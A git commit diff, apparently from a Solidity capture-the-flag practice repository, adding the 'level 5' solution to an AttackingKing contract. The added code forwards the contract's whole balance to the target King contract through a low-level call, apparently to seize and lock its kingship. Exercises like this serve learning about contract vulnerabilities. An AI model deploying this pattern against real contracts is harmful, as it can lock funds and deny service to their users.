fe75b96d22540cfce72ddf37cc1aea11e6dff841
Matt <matt.b.wilder1@gmail.com>
2022-07-31 11:34:10 -0600

    add level 5 solution

--- contracts/5. King/AttackingKing.sol
+++ contracts/5. King/AttackingKing.sol
@@ -5,12 +5,18 @@ import "hardhat/console.sol";
 
 contract AttackingKing {
     address public contractAddress;
+    King public kingContract;
 
     constructor(address _contractAddress) payable {
         contractAddress = _contractAddress;
+        kingContract = King(payable(contractAddress));
     }
 
     function hackContract() external {
         // Code me!
+        (bool success, ) = address(kingContract).call{
+            value: address(this).balance
+        }("");
+        require(success, "external call failed");
     }
 }
